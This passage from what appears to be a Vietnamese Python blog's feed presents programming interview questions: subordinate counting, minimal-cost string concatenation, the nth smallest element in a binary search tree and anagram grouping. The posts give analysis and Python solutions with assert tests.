&lt;/pre&gt;
&lt;p&gt;Số lượng nhân viên cấp dưới của A là 0, B là 0, C là 2, D là 0, E là 1, và F là 5.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Giả sử A là nhân viên cấp dưới của B, và B là nhân viên cấp dưới của C.&lt;/p&gt;
&lt;p&gt;Cách nhìn trực tiếp từ trên xuống theo câu hỏi này là C có 2 nhân viên cấp dưới, và B có một nhân viên cấp dưới. Nếu nhìn ngược lại, ta sẽ nói rằng A &amp;quot;đội&amp;quot; B lên 1, đội tiếp C lên 1, và B đội C lên thêm 1. Tức là mỗi nhân viên sẽ đội tất cả các nhân viên cấp trên của họ lên 1 (A đội B và C, B đội C).&lt;/p&gt;
&lt;p&gt;Do đó, cách giải câu hỏi này là duyệt hết các phần tử trong danh sách, với mỗi phần tử, lần lượt đội (cộng 1) vào kết quả của các nhân viên cấp trên của phần tử đấy.&lt;/p&gt;
&lt;p&gt;Độ phức tạp thực thi là &lt;strong&gt;O(n^2)&lt;/strong&gt; và tốn &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ.&lt;/p&gt;
&lt;p&gt;Nếu bạn có cách giải tốt hơn xin hãy cùng chia sẻ tại &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;employees&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;subordinate_count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;emp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boss&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;employees&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iteritems&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;emp&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;subordinate_count&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;subordinate_count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;emp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;emp&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;boss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;subordinate_count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;boss&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;subordinate_count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;boss&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;emp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boss&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;employees&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;boss&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;subordinate_count&lt;/span&gt;

&lt;span class="n"&gt;inp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;D&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;exp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;D&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;exp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Cộng chuỗi ít tốn nhất</title><link href="/2015/03/phong-van-cong-chuoi-it-ton-nhat.html" rel="alternate"></link><published>2015-03-22T19:08:00+07:00</published><updated>2015-03-22T19:08:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-22:/2015/03/phong-van-cong-chuoi-it-ton-nhat.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho &lt;strong&gt;n&lt;/strong&gt; chuỗi, tìm cách cộng các chuỗi này lại theo một thứ tự nào đó sao cho ít tốn bộ nhớ nhất.&lt;/p&gt;
&lt;p&gt;Ví dụ: Cho chuỗi &lt;strong&gt;A=abc&lt;/strong&gt;, &lt;strong&gt;B=wxyz&lt;/strong&gt;, &lt;strong&gt;C=g&lt;/strong&gt;, và xét hai cách cộng chuỗi sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Cộng &lt;strong&gt;A&lt;/strong&gt; và &lt;strong&gt;B&lt;/strong&gt; trước, sau đó cộng …&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho &lt;strong&gt;n&lt;/strong&gt; chuỗi, tìm cách cộng các chuỗi này lại theo một thứ tự nào đó sao cho ít tốn bộ nhớ nhất.&lt;/p&gt;
&lt;p&gt;Ví dụ: Cho chuỗi &lt;strong&gt;A=abc&lt;/strong&gt;, &lt;strong&gt;B=wxyz&lt;/strong&gt;, &lt;strong&gt;C=g&lt;/strong&gt;, và xét hai cách cộng chuỗi sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Cộng &lt;strong&gt;A&lt;/strong&gt; và &lt;strong&gt;B&lt;/strong&gt; trước, sau đó cộng với &lt;strong&gt;C&lt;/strong&gt;. &lt;strong&gt;A + B&lt;/strong&gt; sẽ tốn &lt;strong&gt;3 + 4 = 7&lt;/strong&gt;. Sau đó cộng thêm &lt;strong&gt;C&lt;/strong&gt; sẽ tốn &lt;strong&gt;7 + 1 = 8&lt;/strong&gt;. Tổng cộng tốn &lt;strong&gt;7 + 8 = 15&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Cộng &lt;strong&gt;A&lt;/strong&gt; và &lt;strong&gt;C&lt;/strong&gt; trước, sau đó cộng với &lt;strong&gt;B&lt;/strong&gt;. &lt;strong&gt;A + C&lt;/strong&gt; tốn &lt;strong&gt;3 + 1 = 4&lt;/strong&gt;. Sau đó cộng thêm &lt;strong&gt;B&lt;/strong&gt; sẽ tốn &lt;strong&gt;4 + 4 = 8&lt;/strong&gt;. Tổng cộng tốn &lt;strong&gt;4 + 8 = 12&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Cách cộng chuỗi thứ 2 đỡ tốn bộ nhớ hơn cách thứ 1, và cũng là cách tốn ít bộ nhớ nhất.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Việc cộng &lt;strong&gt;n&lt;/strong&gt; chuỗi với nhau luôn luôn tốn &lt;strong&gt;n-1&lt;/strong&gt; phép cộng chuỗi, và tạo ra chuỗi cuối cùng với độ lớn không đổi. Do đó, lý do tốn bộ nhớ không phải là vì kết quả cuối cùng, mà là do các mảng nhớ tạm ta phải sử dụng để chứa kết quả của các phép cộng chuỗi này.&lt;/p&gt;
&lt;p&gt;Xét ba chuỗi bất kỳ với độ lớn &lt;strong&gt;x &amp;lt;= y &amp;lt;= z&lt;/strong&gt;. Ta cần thực hiện 2 phép cộng chuỗi, và độ lớn của chuỗi cuối cùng sẽ là tổng của &lt;strong&gt;x + y + z&lt;/strong&gt; không đổi. Độ lớn của chuỗi tạm sẽ là tổng này trừ đi độ lớn của chuỗi gốc trong phép cộng chuỗi thứ 2. Dễ thấy rằng nếu ta để dành chuỗi có độ lớn &lt;strong&gt;z&lt;/strong&gt; để cộng cuối cùng, thì độ lớn của chuỗi tạm sẽ là nhỏ nhất, &lt;strong&gt;x + y&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Do đó, ta sẽ để dành chuỗi có chiều dài lớn nhất cho các phép cộng sau cùng, chuỗi có độ dài lớn thứ hai cho phép cộng kế cuối... Vì vậy, cách giải bài toán này chỉ đơn giản là sắp xếp các chuỗi đã cho theo thứ tự tăng dần về độ lớn chuỗi.&lt;/p&gt;
&lt;p&gt;Phần cài đặt xin được để dành làm một thử thách nhỏ cho bạn đọc. &lt;a class="reference external" href="forum.vithon.org"&gt;Diễn đàn&lt;/a&gt; là nơi phù hợp để trao đổi thêm về những vấn đề tương tự.&lt;/p&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: In ra phần tử nhỏ thứ n trong cây nhị phân</title><link href="/2015/03/phong-van-in-ra-phan-tu-nho-thu-n-trong-cay-nhi-phan.html" rel="alternate"></link><published>2015-03-19T04:19:00+07:00</published><updated>2015-03-19T04:19:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-19:/2015/03/phong-van-in-ra-phan-tu-nho-thu-n-trong-cay-nhi-phan.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một cây nhị phân tìm kiếm (binary search tree), in ra phần tử nhỏ thứ &lt;strong&gt;n&lt;/strong&gt; trong cây này.&lt;/p&gt;
&lt;p&gt;Ví dụ: Với cây nhị phân như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
        7
   5         9
3     6         10
&lt;/pre&gt;
&lt;p&gt;Phần tử nhỏ nhất (&lt;strong&gt;n=1&lt;/strong&gt;) là 3, phần tử nhỏ thứ 2 là …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một cây nhị phân tìm kiếm (binary search tree), in ra phần tử nhỏ thứ &lt;strong&gt;n&lt;/strong&gt; trong cây này.&lt;/p&gt;
&lt;p&gt;Ví dụ: Với cây nhị phân như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
        7
   5         9
3     6         10
&lt;/pre&gt;
&lt;p&gt;Phần tử nhỏ nhất (&lt;strong&gt;n=1&lt;/strong&gt;) là 3, phần tử nhỏ thứ 2 là 5, phần tử nhỏ thứ 3 là 6.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Vì đây là cây nhị phân tìm kiếm nên ta luôn có điều kiện bất biến là các đỉnh bên trái luôn luôn nhỏ hơn hoặc bằng, và các đỉnh bên phải luôn luôn lớn hơn hoặc bằng giá trị của đỉnh đang xét.&lt;/p&gt;
&lt;p&gt;Do đó, phần tử nhỏ nhất thứ &lt;strong&gt;n&lt;/strong&gt; cũng là phần tử thứ &lt;strong&gt;n&lt;/strong&gt; trong quá trình duyệt cây theo thứ tự &lt;strong&gt;trái, giữa, phải&lt;/strong&gt;, tức là theo cách tìm kiếm ưu tiên chiều sâu (depth first search).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;traverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Trả về (số đỉnh đã qua, và kết quả).&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

        &lt;span class="c1"&gt;# Tìm trong nhánh trái&lt;/span&gt;
        &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;traverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="c1"&gt;# Tìm thấy kết quả bên nhánh trái.&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt;

        &lt;span class="n"&gt;nr_seen&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="c1"&gt;# Đỉnh hiện tại chính là đỉnh cần tìm.&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;

        &lt;span class="c1"&gt;# Tìm trong nhánh phải&lt;/span&gt;
        &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;traverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt;

    &lt;span class="n"&gt;nr_seen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;traverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;left&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;right&lt;/span&gt;


&lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Tìm các từ cùng bộ ký tự</title><link href="/2015/03/phong-van-tim-cac-tu-cung-bo-ky-tu.html" rel="alternate"></link><published>2015-03-16T02:05:00+07:00</published><updated>2015-03-16T02:05:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-16:/2015/03/phong-van-tim-cac-tu-cung-bo-ky-tu.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một quyển từ điển &lt;strong&gt;D&lt;/strong&gt;, và một từ &lt;strong&gt;W&lt;/strong&gt; trong từ điển, yêu cầu xuất ra tất cả các từ có trong từ điển với cùng bộ ký tự như từ &lt;strong&gt;W&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ví dụ từ &lt;strong&gt;mary&lt;/strong&gt; có bộ ký tự là một chữ &lt;strong&gt;m&lt;/strong&gt;, một chữ &lt;strong&gt;a …&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một quyển từ điển &lt;strong&gt;D&lt;/strong&gt;, và một từ &lt;strong&gt;W&lt;/strong&gt; trong từ điển, yêu cầu xuất ra tất cả các từ có trong từ điển với cùng bộ ký tự như từ &lt;strong&gt;W&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ví dụ từ &lt;strong&gt;mary&lt;/strong&gt; có bộ ký tự là một chữ &lt;strong&gt;m&lt;/strong&gt;, một chữ &lt;strong&gt;a&lt;/strong&gt;, một chữ &lt;strong&gt;r&lt;/strong&gt; và một chữ &lt;strong&gt;y&lt;/strong&gt;, từ &lt;strong&gt;army&lt;/strong&gt; cũng có cùng bộ ký tự như vậy.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Mối quan hệ giữa từ, và bộ ký tự là &lt;strong&gt;1-n&lt;/strong&gt;, tức là một từ sẽ có một bộ ký tự, nhưng một bộ ký tự có thể có nhiều từ. Do đó, cách giải bài này là thể hiện mối quan hệ giữa từ và bộ ký tự của nó.&lt;/p&gt;
